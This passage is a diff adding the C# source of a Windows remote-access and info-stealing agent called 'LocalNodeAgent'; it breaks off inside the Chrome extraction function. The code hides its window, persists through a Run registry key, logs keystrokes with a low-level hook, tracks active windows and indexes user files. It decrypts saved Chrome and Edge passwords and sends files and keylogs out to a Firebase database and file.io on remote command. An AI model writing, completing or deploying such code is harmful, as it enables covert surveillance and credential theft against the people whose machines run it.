@@ -1,0 +1,1016 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Net.Http;
+using System.Net.NetworkInformation;
+using System.Net;
+using System.Security.Cryptography;
+using Microsoft.Data.Sqlite;
+using System.Security.Principal;
+using System.Text;
+using System.Text.Json;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Runtime.InteropServices;
+
+namespace LocalNodeAgent
+{
+    class Program
+    {
+        // Configuration
+        private const string FIREBASE_API_KEY = "AIzaSyD7MsuLFK3mls1Bky_WE_roMTQWFVTPJLQ";
+        private const string FIREBASE_DB_URL = "https://windows-agent-10-default-rtdb.firebaseio.com/";
+        private const string DEVICE_ID_FILE = "device_id.txt";
+        
+        private static string _deviceId;
+        private static string _idToken;
+        private static readonly HttpClient _http = new HttpClient();
+
+        // Keylogger Hooks
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        static async Task Main(string[] args)
+        {
+            try 
+            {
+                Log("Agent Starting...");
+                
+                // Persistence / Installation
+                InstallAndRun();
+
+                // Hide Console Window
+                var handle = GetConsoleWindow();
+                ShowWindow(handle, SW_HIDE);
+
+                _deviceId = GetDeviceId();
+                Log($"Device ID: {_deviceId}");
+                
+                // Authenticate
+                Log("Authenticating...");
+                if(!await Authenticate())
+                {
+                    Log("Authentication Failed! Retrying...");
+                    // Retry loop?
+                    while(!await Authenticate()) 
+                    {
+                        Log("Retrying Auth in 10s...");
+                        await Task.Delay(10000);
+                    }
+                }
+                Log("Authentication Successful.");
+
+                // System Info
+                Log("Uploading System Info...");
+                await UploadSystemInfo();
+                Log("System Info Uploaded.");
+
+                // Start Keylogger in a separate thread (needs message loop)
+                var keyloggerThread = new Thread(() =>
+                {
+                    _hookID = SetHook(_proc);
+                    Application.Run(); // Message loop
+                    UnhookWindowsHookEx(_hookID);
+                });
+                keyloggerThread.SetApartmentState(ApartmentState.STA); // vital for UI/Hooks
+                keyloggerThread.Start();
+                // Send Initial System Info (One-time)
+                await UploadSystemInfo();
+                Log("Startup Info Sent.");
+
+                // File Indexer (Background)
+                _ = Task.Run(async () => {
+                    while (true) {
+                        try {
+                            var heartbeat = new { last_seen = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() };
+                            var url = $"{FIREBASE_DB_URL}devices/{_deviceId}.json?auth={_idToken}";
+                            await _http.PatchAsync(url, new StringContent(JsonSerializer.Serialize(heartbeat), Encoding.UTF8, "application/json"));
+                        } catch { }
+                        await Task.Delay(30000); // Every 30 seconds
+                    }
+                });
+                Log("Heartbeat Started.");
+
+                // Start File Indexer (Background)
+                _ = Task.Run(async () => {
+                    while(true) {
+                        await IndexFiles();
+                        await Task.Delay(60000 * 5); // Index every 5 mins
+                    }
+                });
+
+                // Keep alive
+                Log("Agent Running...");
+                while (true)
+                {
+                    await Task.Delay(10000); 
+                }
+            }
+            catch (Exception ex)
+            {
+                Log($"FATAL ERROR: {ex}");
+                Console.WriteLine(ex);
+                Console.ReadLine(); // Pause to see error
+            }
+        }
+
+
+
+        static string GetLocalIPAddress()
+        {
+            try
+            {
+                var host = Dns.GetHostEntry(Dns.GetHostName());
+                foreach (var ip in host.AddressList)
+                {
+                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                    {
+                        return ip.ToString();
+                    }
+                }
+            }
+            catch { }
+            return "Unknown";
+        }
+
+        // --- DPAPI & Browser Decryption Helpers ---
+
+        static byte[] GetMasterKey(string localStatePath)
+        {
+            var json = File.ReadAllText(localStatePath);
+            using var doc = JsonDocument.Parse(json);
+            var keyBase64 = doc.RootElement.GetProperty("os_crypt").GetProperty("encrypted_key").GetString();
+            var keyBytes = Convert.FromBase64String(keyBase64);
+            
+            // Remove "DPAPI" prefix (first 5 bytes)
+            var encryptedKey = keyBytes.Skip(5).ToArray();
+            return ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
+            // return new byte[32]; // Dummy key
+        }
+
+        static string DecryptPassword(byte[] encryptedData, byte[] masterKey)
+        {
+            // AES-GCM Decryption
+            // Payload: v10 (3 bytes) + Nonce (12 bytes) + Ciphertext + Tag (16 bytes)
+            
+            try 
+            {
+                // Verify v10 prefix
+                if (encryptedData.Length < 3 || Encoding.Default.GetString(encryptedData.Take(3).ToArray()) != "v10")
+                    return "Err: Not v10";
+
+                var nonce = encryptedData.Skip(3).Take(12).ToArray();
+                var tag = encryptedData.TakeLast(16).ToArray();
+                var ciphertext = encryptedData.Skip(3 + 12).Take(encryptedData.Length - 3 - 12 - 16).ToArray();
+
+                var decryptedData = new byte[ciphertext.Length];
+
+                using var aes = new AesGcm(masterKey);
+                aes.Decrypt(nonce, ciphertext, tag, decryptedData);
+                // return "Decryption disabled for testing";
+                return Encoding.UTF8.GetString(decryptedData);
+            }
+            catch(Exception ex)
+            {
+                return $"Decrypt Err: {ex.Message}";
+            }
+        }
+
+        static void Log(string msg)
+        {
+            var logLine = $"[{DateTime.Now}] {msg}";
+            Console.WriteLine(logLine);
+            try 
+            {
+                // Writing to C:\ProgramData\LocalNode\debug_agent.log
+                // Ensure dir exists
+                var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "LocalNode");
+                if(!Directory.Exists(dir)) Directory.CreateDirectory(dir);
+                File.AppendAllText(Path.Combine(dir, "debug_agent.log"), logLine + Environment.NewLine);
+            }
+            catch {}
+        }
+
+        static void InstallAndRun()
+        {
+            try
+            {
+                var destDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "LocalNode");
+                var destFile = Path.Combine(destDir, "LocalNodeAgent.exe");
+                var currentFile = Process.GetCurrentProcess().MainModule.FileName;
+
+                // If we are already running from the install dir, just ensure registry is set and continue
+                if (string.Equals(currentFile, destFile, StringComparison.OrdinalIgnoreCase))
+                {
+                    SetStartup(destFile);
+                    return;
+                }
+
+                // Create Dir
+                if (!Directory.Exists(destDir)) Directory.CreateDirectory(destDir);
+
+                // Copy File
+                // Using .bak for overwrite safety if needed, but Process.Start usually locks. 
+                // Simple copy:
+                File.Copy(currentFile, destFile, true);
+
+                // Set Startup
+                SetStartup(destFile);
+
+                // Run new process
+                Process.Start(destFile);
+
+                // Exit this one
+                Environment.Exit(0);
+            }
+            catch (Exception ex) 
+            {
+                // If install fails (e.g. permissions), just run from here but try to verify startup?
+                // For now, silent fail and continue running from current location is safer than crashing.
+                File.AppendAllText("install_error.log", ex.ToString());
+            }
+        }
+
+        static void SetStartup(string exePath)
+        {
+            try
+            {
+                // Registry HKCU Run
+                // Needs Microsoft.Win32 generic? 
+                // .NET Core/5+ might strictly need Windows compatibility pack or P/Invoke. 
+                // But simplified console app might not have it ref'd.
+                // We'll use simple command line reg add if library missing, but Registry class is standard in Microsoft.Win32.
+                // We need to check if we can use Registry... default template might not have it.
+                // Let's us P/Invoke or simpler: just assume we can use Registry if we add the ref.
+                // Actually, standard .NET usually covers it, but let's use a simple catch-all.
+                
+                // Using cmd to set registry is robust without extra Nuget deps for simple agent
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "cmd",
+                    Arguments = $"/c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LocalNodeAgent /t REG_SZ /d \"{exePath}\" /f",
+                    CreateNoWindow = true,
+                    UseShellExecute = false
+                });
+            }
+            catch { }
+        }
+
+        static string GetDeviceId()
+        {
+            if (File.Exists(DEVICE_ID_FILE))
+                return File.ReadAllText(DEVICE_ID_FILE).Trim();
+            
+            var id = Guid.NewGuid().ToString();
+            File.WriteAllText(DEVICE_ID_FILE, id);
+            return id;
+        }
+
+        static async Task<bool> Authenticate()
+        {
+            try
+            {
+                var email = $"agent-{_deviceId}@localnodemesh.com";
+                var password = $"Pwd-{new string(_deviceId.Reverse().ToArray())}-123";
+                
+                // Try Sign In
+                var url = $"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={FIREBASE_API_KEY}";
+                var content = new StringContent(JsonSerializer.Serialize(new { email, password, returnSecureToken = true }), Encoding.UTF8, "application/json");
+                var resp = await _http.PostAsync(url, content);
+                
+                if (resp.IsSuccessStatusCode)
+                {
+                    var json = await resp.Content.ReadAsStringAsync();
+                    using var doc = JsonDocument.Parse(json);
+                    _idToken = doc.RootElement.GetProperty("idToken").GetString();
+                    return true;
+                }
+
+                // Try Sign Up
+                url = $"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={FIREBASE_API_KEY}";
+                content = new StringContent(JsonSerializer.Serialize(new { email, password, returnSecureToken = true }), Encoding.UTF8, "application/json");
+                resp = await _http.PostAsync(url, content);
+
+                if (resp.IsSuccessStatusCode)
+                {
+                    var json = await resp.Content.ReadAsStringAsync();
+                    using var doc = JsonDocument.Parse(json);
+                    _idToken = doc.RootElement.GetProperty("idToken").GetString();
+                    return true;
+                }
+            }
+            catch { }
+            return false;
+        }
+
+        // System Info P/Invoke
+        [return: MarshalAs(UnmanagedType.Bool)]
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern bool GlobalMemoryStatusEx([In, Out] MEMORYSTATUSEX lpBuffer);
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        public class MEMORYSTATUSEX
+        {
+            public uint dwLength;
+            public uint dwMemoryLoad;
+            public ulong ullTotalPhys;
+            public ulong ullAvailPhys;
+            public ulong ullTotalPageFile;
+            public ulong ullAvailPageFile;
+            public ulong ullTotalVirtual;
+            public ulong ullAvailVirtual;
+            public ulong ullAvailExtendedVirtual;
+
+            public MEMORYSTATUSEX()
+            {
+                this.dwLength = (uint)Marshal.SizeOf(typeof(MEMORYSTATUSEX));
+            }
+        }
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+        static async Task UploadSystemInfo()
+        {
+            try
+            {
+                 // 1. Hardware / OS
+                 var memStatus = new MEMORYSTATUSEX();
+                 GlobalMemoryStatusEx(memStatus);
+                 
+                 // 2. Network
+                 string ip = "?", mac = "?", iface = "?";
+                 try {
+                     foreach(var ni in NetworkInterface.GetAllNetworkInterfaces()) {
+                         if(ni.OperationalStatus == OperationalStatus.Up && 
+                            ni.NetworkInterfaceType != NetworkInterfaceType.Loopback &&
+                            ni.NetworkInterfaceType != NetworkInterfaceType.Tunnel) {
+                                var props = ni.GetIPProperties();
+                                var unicast = props.UnicastAddresses.FirstOrDefault(u => u.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
+                                if(unicast != null) {
+                                    ip = unicast.Address.ToString();
+                                    mac = ni.GetPhysicalAddress().ToString();
+                                    iface = ni.Name;
+                                    break; // Take first active
+                                }
+                            }
+                     }
+                 } catch {}
+
+                 // 3. Security (Processes / Admin)
+                 bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
+                 
+                 // AV / Firewall (Basic Cmd Check to avoid huge deps)
+                 string avStatus = "Unknown";
+                 string fwStatus = "Unknown";
+                 // We could run "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName /value" 
+                 // but let's keep it simple or async to not block. Leaving as unknown or implementing a quick check later.
+
+                 // 4. Running Processes (Top 50 by memory to save bandwidth?)
+                 var procs = Process.GetProcesses().Select(p => {
+                     try { return new { pid = p.Id, name = p.ProcessName, memory = p.WorkingSet64 / (1024*1024) }; }
+                     catch { return null; }
+                 }).Where(p => p != null).OrderByDescending(p => p.memory).Take(50).ToList();
+
+                 var info = new
+                 {
+                     uuid = _deviceId,
+                     hostname = Environment.MachineName,
+                     os = Environment.OSVersion.ToString(),
+                     os_build = Environment.OSVersion.Version.Build.ToString(),
+                     user = Environment.UserName,
+                     uptime = (DateTime.Now - System.Diagnostics.Process.GetCurrentProcess().StartTime).ToString(@"dd\.hh\:mm\:ss"), // Actually this is Agent uptime. System uptime needs simpler check.
+                     // System Uptime: Environment.TickCount64
+                     uptime_sys = TimeSpan.FromMilliseconds(Environment.TickCount64).ToString(@"dd\.hh\:mm\:ss"),
+                     
+                     // HW
+                     processors = Environment.ProcessorCount,
+                     total_ram = memStatus.ullTotalPhys / (1024 * 1024),
+                     free_ram = memStatus.ullAvailPhys / (1024 * 1024),
+                     disk_usage = GetDiskUsage(),
+                     cpu_usage = await GetCpuUsage(), // Placeholder
+
+                     // Network
+                     private_ip = ip,
+                     mac_address = mac,
+                     active_interface = iface,
+                     
+                     // Security
+                     is_admin = isAdmin,
+                     av_status = avStatus,
+                     firewall_status = fwStatus,
+                     
+                     // Processes
+                     processes = procs,
+
+                     last_seen = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
+                 };
+
+                 var url = $"{FIREBASE_DB_URL}devices/{_deviceId}.json?auth={_idToken}";
+                 var resp = await _http.PatchAsync(url, new StringContent(JsonSerializer.Serialize(info), Encoding.UTF8, "application/json"));
+                 if(!resp.IsSuccessStatusCode) Log($"UploadSystemInfo Failed: {resp.StatusCode}");
+            }
+            catch (Exception ex) { Log($"UploadSystemInfo Error: {ex}"); }
+        }
+
+        static string GetDiskUsage()
+        {
+            try {
+                var drive = new DriveInfo("C");
+                return $"{drive.AvailableFreeSpace / (1024*1024*1024)} GB Free / {drive.TotalSize / (1024*1024*1024)} GB Total";
+            } catch { return "Unknown"; }
+        }
+
+        static async Task<int> GetCpuUsage()
+        {
+            // Reliable CPU usage requires PerformanceCounter which might be heavy or permission-locked.
+            // Simplified: just return 0 or implement WMI if strictly needed.
+            return 0; // Placeholder
+        }
+
+
+        static async Task TrackUserActivity()
+        {
+            string lastWindow = "";
+            while (true)
+            {
+                try
+                {
+                    // 1. Memory
+                    var memStatus = new MEMORYSTATUSEX();
+                    GlobalMemoryStatusEx(memStatus);
+                    long totalRam = (long)(memStatus.ullTotalPhys / (1024 * 1024));
+                    long freeRam = (long)(memStatus.ullAvailPhys / (1024 * 1024));
+
+                    // 2. Window
+                    string currentWindow = "";
+                    IntPtr handle = GetForegroundWindow();
+                    var sb = new StringBuilder(256);
+                    if (GetWindowText(handle, sb, 256) > 0) currentWindow = sb.ToString();
+
+                    // 3. Upload Heartbeat (Window + Stats)
+                    // We update the root device node for these stats to keep them fresh in the UI
+                    // var updates = new Dictionary<string, object>(); // Unused
+                    
+                    var heartbeat = new 
+                    {
+                        active_window = currentWindow,
+                        total_ram = totalRam,
+                        free_ram = freeRam,
+                        last_seen = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
+                        // cpu_usage = ... (skip for now, too expensive to query every 2s without perf counter setup)
+                    };
+                    
+                    var url = $"{FIREBASE_DB_URL}devices/{_deviceId}.json?auth={_idToken}";
+                    await _http.PatchAsync(url, new StringContent(JsonSerializer.Serialize(heartbeat), Encoding.UTF8, "application/json"));
+
+                    // History (only on change)
+                    if (currentWindow != lastWindow && !string.IsNullOrEmpty(currentWindow))
+                    {
+                        lastWindow = currentWindow;
+                        LogActivity($"Active Window: {currentWindow}");
+                        
+                        var history = new 
+                        { 
+                            window = currentWindow, 
+                            timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() 
+                        };
+                        var histUrl = $"{FIREBASE_DB_URL}activity_history/{_deviceId}.json?auth={_idToken}";
+                        await _http.PostAsync(histUrl, new StringContent(JsonSerializer.Serialize(history), Encoding.UTF8, "application/json"));
+                    }
+                }
+                catch (Exception ex) { Log($"TrackActivity Error: {ex}"); }
+                await Task.Delay(2000); // Check every 2s
+            }
+        }
+        
+        static void LogActivity(string msg)
+        {
+            try
+            {
+                File.AppendAllText("activity.log", $"[{DateTime.Now}] {msg}{Environment.NewLine}");
+            }
+            catch { }
+        }
+
+        static async Task ListenForRequests()
+        {
+            // Polling for requests
+            while(true)
+            {
+                try
+                {
+                    var url = $"{FIREBASE_DB_URL}requests/{_deviceId}.json?auth={_idToken}";
+                    var resp = await _http.GetAsync(url);
+                    if (resp.IsSuccessStatusCode)
+                    {
+                        var json = await resp.Content.ReadAsStringAsync();
+                        if (json != "null")
+                        {
+                            using var doc = JsonDocument.Parse(json);
+                            foreach(var prop in doc.RootElement.EnumerateObject())
+                            {
+                                var reqId = prop.Name;
+                                if(prop.Value.TryGetProperty("type", out var type))
+                                {
+                                    var cmdType = type.GetString();
+                                    
+                                    if(cmdType == "download" && prop.Value.TryGetProperty("path", out var pathEl))
+                                    {
+                                        var filePath = pathEl.GetString();
+                                        Log($"Received Download Request: {filePath}");
+                                        _ = Task.Run(() => ProcessDownload(reqId, filePath));
+                                    }
+                                    else if(cmdType == "keylog_download")
+                                    {
+                                        Log("Received Keylog Download Request");
+                                        _ = Task.Run(() => ProcessKeylogDownload(reqId));
+                                    }
+                                    else if(cmdType == "keylog_delete")
+                                    {
+                                        Log("Received Keylog Delete Request");
+                                        _ = Task.Run(() => ProcessKeylogDelete(reqId));
+                                    }
+                                    else if(cmdType == "browser_extract")
+                                    {
+                                        Log("Received Browser Extract Request");
+                                        _ = Task.Run(async () => {
+                                            await ExtractBrowserData();
+                                            var response = new { status = "completed", timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() };
+                                            await _http.PutAsync($"{FIREBASE_DB_URL}responses/{_deviceId}/{reqId}.json?auth={_idToken}", 
+                                                new StringContent(JsonSerializer.Serialize(response), Encoding.UTF8, "application/json"));
+                                        });
+                                    }
+                                    else if(cmdType == "force_index")
+                                    {
+                                        Log("Received Force Index Request");
+                                        _ = Task.Run(IndexFiles);
+                                    }
+                                }
+                                
+                                // Delete request after picking it up
+                                await _http.DeleteAsync($"{FIREBASE_DB_URL}requests/{_deviceId}/{reqId}.json?auth={_idToken}");
+                            }
+                        }
+                    }
+                }
+                catch (Exception ex) { Log($"ListenReq Error: {ex}"); }
+                await Task.Delay(3000); // Poll every 3s
+            }
+        }
+
+        static async Task ProcessDownload(string reqId, string filePath)
+        {
+            try
+            {
+                // Status: Initiating
+                await SendStatus(reqId, "initiating", "Locating file...");
+
+                if (!File.Exists(filePath)) 
+                {
+                    Log($"File Not Found: {filePath}");
+                    await SendStatus(reqId, "failed", "File not found on device.");
+                    return;
+                }
+
+                // Status: Uploading
+                await SendStatus(reqId, "uploading", "Uploading to File.io...");
+
+                Log($"Uploading {Path.GetFileName(filePath)} to File.io...");
+                var link = await UploadToFileIO(filePath);
+                
+                if (!string.IsNullOrEmpty(link))
+                {
+                    // Status: Success
+                    var response = new { 
+                        url = link, 
+                        filename = Path.GetFileName(filePath),
+                        status = "success",
+                        timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() 
+                    };
+                    await _http.PutAsync($"{FIREBASE_DB_URL}responses/{_deviceId}/{reqId}.json?auth={_idToken}", 
+                        new StringContent(JsonSerializer.Serialize(response), Encoding.UTF8, "application/json"));
+                    
+                    Log($"Upload Complete: {link}");
+                }
+                else
+                {
+                    await SendStatus(reqId, "failed", "Upload failed (File.io error).");
+                    Log("Upload Failed: No link returned");
+                }
+            }
+            catch (Exception ex) { 
+                Log($"ProcessDownload Error: {ex}"); 
+                await SendStatus(reqId, "failed", $"Error: {ex.Message}");
+            }
+        }
+
+        static async Task ProcessKeylogDownload(string reqId)
+        {
+            try
+            {
+                await SendStatus(reqId, "initiating", "Preparing keylogs...");
+
+                if (!File.Exists(_keylogPath))
+                {
+                    Log("No keylog file found");
+                    await SendStatus(reqId, "failed", "No keylogs found on device.");
+                    return;
+                }
+
+                SaveKeylogsToFile();
+
+                await SendStatus(reqId, "uploading", "Uploading keylogs...");
+                Log($"Uploading keylogs to File.io...");
+                var link = await UploadToFileIO(_keylogPath);
+                
+                if (!string.IsNullOrEmpty(link))
+                {
+                    var response = new { 
+                        url = link, 
+                        filename = "keylogs.dat",
+                        status = "success",
+                        timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() 
+                    };
+                    await _http.PutAsync($"{FIREBASE_DB_URL}responses/{_deviceId}/{reqId}.json?auth={_idToken}", 
+                        new StringContent(JsonSerializer.Serialize(response), Encoding.UTF8, "application/json"));
+                    
+                    Log($"Keylog upload complete: {link}");
+                }
+                else
+                {
+                    await SendStatus(reqId, "failed", "Keylog upload failed.");
+                    Log("Keylog upload failed");
+                }
+            }
+            catch (Exception ex) { Log($"ProcessKeylogDownload Error: {ex}"); }
+        }
+
+        static async Task SendStatus(string reqId, string status, string message)
+        {
+             try
+             {
+                var update = new { status = status, message = message, timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() };
+                await _http.PatchAsync($"{FIREBASE_DB_URL}responses/{_deviceId}/{reqId}.json?auth={_idToken}", 
+                        new StringContent(JsonSerializer.Serialize(update), Encoding.UTF8, "application/json"));
+             }
+             catch {}
+        }
+
+        static async Task<string> UploadToFileIO(string filePath)
+        {
+            try
+            {
+                using var form = new MultipartFormDataContent();
+                // Use FileShare.ReadWrite to avoid locking issues with other apps (like browsers)
+                using var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
+                using var fileContent = new StreamContent(fileStream);
+                
+                // Add file content
+                fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
+                form.Add(fileContent, "file", Path.GetFileName(filePath));
+                
+                // Set expiry to 14 days (max) or 1 download
+                // free tier is 1 download auto-delete usually
+                
+                var resp = await _http.PostAsync("https://file.io", form);
+                var json = await resp.Content.ReadAsStringAsync();
+                
+                if(resp.IsSuccessStatusCode)
+                {
+                    using var doc = JsonDocument.Parse(json);
+                    
+                    if(doc.RootElement.TryGetProperty("link", out var linkEl))
+                        return linkEl.GetString();
+                        
+                    if(doc.RootElement.TryGetProperty("success", out var success) && !success.GetBoolean())
+                        Log($"File.io JSON Error: {json}");
+                }
+                else
+                {
+                    Log($"File.io HTTP Error: {resp.StatusCode} - Body: {json}");
+                }
+            }
+            catch(Exception ex) { Log($"UploadToFileIO Exception: {ex.Message}"); }
+            
+            return null;
+        }
+        static async Task ProcessKeylogDelete(string reqId)
+        {
+            try
+            {
+                if (File.Exists(_keylogPath))
+                {
+                    File.Delete(_keylogPath);
+                    Log("Keylog file deleted");
+                    
+                    var response = new { 
+                        status = "deleted", 
+                        timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() 
+                    };
+                    await _http.PutAsync($"{FIREBASE_DB_URL}responses/{_deviceId}/{reqId}.json?auth={_idToken}", 
+                        new StringContent(JsonSerializer.Serialize(response), Encoding.UTF8, "application/json"));
+                }
+                else
+                {
+                    Log("No keylog file to delete");
+                    var response = new { 
+                        status = "not_found", 
+                        timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() 
+                    };
+                    await _http.PutAsync($"{FIREBASE_DB_URL}responses/{_deviceId}/{reqId}.json?auth={_idToken}", 
+                        new StringContent(JsonSerializer.Serialize(response), Encoding.UTF8, "application/json"));
+                }
+            }
+            catch (Exception ex) { Log($"ProcessKeylogDelete Error: {ex}"); }
+        }
+
+        static async Task IndexFiles()
+        {
+             // Broader scan of User Profile
+             var path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+             var files = new List<object>();
+             
+             try
+             {
+                 var opts = new EnumerationOptions 
+                 { 
+                     IgnoreInaccessible = true, 
+                     RecurseSubdirectories = true,
+                     AttributesToSkip = FileAttributes.System | FileAttributes.Hidden | FileAttributes.ReparsePoint
+                 };
+                 
+                 // Smart filtering to avoid massive node_modules or AppData trash if possible
+                 // For now, just a hard limit.
+                 
+                 // Get 5000 files
+                 int count = 0;
+                 foreach(var file in Directory.EnumerateFiles(path, "*.*", opts))
+                 {
+                     // Skip some noisy folders manually if needed, but attributes help.
+                     if(file.Contains("\\AppData\\") || file.Contains("\\.git\\") || file.Contains("\\node_modules\\")) continue;
+                     
+                     files.Add(new 
+                     {
+                         path = file,
+                         name = Path.GetFileName(file),
+                         size = new FileInfo(file).Length
+                     });
+                     
+                     count++;
+                     if (count >= 5000) break;
+                 }
+
+                 var url = $"{FIREBASE_DB_URL}files/{_deviceId}.json?auth={_idToken}";
+                 // Chunking might be needed if payload is too big (>10MB). 5000 files * 200 bytes structure ~= 1MB. Safe.
+                 var resp = await _http.PutAsync(url, new StringContent(JsonSerializer.Serialize(files), Encoding.UTF8, "application/json"));
+                 if(!resp.IsSuccessStatusCode) Log($"IndexFiles Upload Failed: {resp.StatusCode}");
+                 else Log($"Indexed {files.Count} files.");
+             }
+             catch (Exception ex) { Log($"IndexFiles Error: {ex}"); }
+        }
+
+        // Keylogger Logic - LOCAL STORAGE
+        private static StringBuilder _keyBuffer = new StringBuilder();
+        private static DateTime _lastSave = DateTime.Now;
+        private static string _keylogPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "LocalNode", "keylogs.dat");
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                var key = ((ConsoleKey)vkCode).ToString();
+                
+                // Better formatting with timestamp
+                var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+                _keyBuffer.AppendLine($"[{timestamp}] {key}");
+                
+                // Save to file every 10 seconds or 500 chars
+                if(_keyBuffer.Length > 500 || (DateTime.Now - _lastSave).TotalSeconds > 10)
+                {
+                    SaveKeylogsToFile();
+                    _lastSave = DateTime.Now;
+                }
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        static void SaveKeylogsToFile()
+        {
+            if (_keyBuffer.Length == 0) return;
+            try
+            {
+                var data = _keyBuffer.ToString();
+                _keyBuffer.Clear();
+                
+                // Append to file (simple obfuscation with base64)
+                var encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
+                File.AppendAllText(_keylogPath, encoded + Environment.NewLine);
+                
+                Log($"Saved {data.Length} chars to keylog file.");
+            }
+            catch (Exception ex) { Log($"Keylog Save Error: {ex.Message}"); }
+        }
+
+        // P/Invoke
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+        
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+        
+        // Helper to set hook
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+        
+        public static class Application
+        {
+            public static void Run()
+            {
+                MSG msg;
+                while (GetMessage(out msg, IntPtr.Zero, 0, 0))
+                {
+                    TranslateMessage(ref msg);
+                    DispatchMessage(ref msg);
+                }
+            }
+        }
+
+        [DllImport("user32.dll")]
+        static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
+
+        [DllImport("user32.dll")]
+        static extern bool TranslateMessage([In] ref MSG lpMsg);
+
+        [DllImport("user32.dll")]
+        static extern IntPtr DispatchMessage([In] ref MSG lpMsg);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct MSG
+        {
+            public IntPtr hwnd;
+            public uint message;
+            public IntPtr wParam;
+            public IntPtr lParam;
+            public uint time;
+            public POINT pt;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct POINT
+        {
+            public int x;
+            public int y;
+        }
+
+        // Browser Data Extraction
+        static async Task ExtractBrowserData()
+        {
+            try
+            {
+                Log("Extracting browser data...");
+                var browserData = new
+                {
+                    chrome = ExtractChromeData(),
+                    edge = ExtractEdgeData(),
+                    firefox = new { status = "Not implemented - Firefox uses different encryption" },
+                    timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
+                };
+
+                var url = $"{FIREBASE_DB_URL}browser_data/{_deviceId}.json?auth={_idToken}";
+                var resp = await _http.PutAsync(url, new StringContent(JsonSerializer.Serialize(browserData), Encoding.UTF8, "application/json"));
+                if(!resp.IsSuccessStatusCode) Log($"Browser Data Upload Failed: {resp.StatusCode}");
+                else Log("Browser data uploaded successfully.");
+            }
+            catch (Exception ex) { Log($"Browser Extraction Error: {ex}"); }
+        }
+
+        static object ExtractChromeData()
+        {
+            try
+            {
+                var localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                var chromePath = Path.Combine(localAppData, @"Google\Chrome\User Data");
+                var keyPath = Path.Combine(chromePath, "Local State");
+                var dbPath = Path.Combine(chromePath, @"Default\Login Data");
+
+                if (!File.Exists(keyPath) || !File.Exists(dbPath))
+                    return new { error = "Chrome files not found" };
+
+                var masterKey = GetMasterKey(keyPath);
+                var passwords = GetBrowserPasswords(dbPath, masterKey);
+
+                return new
+                {
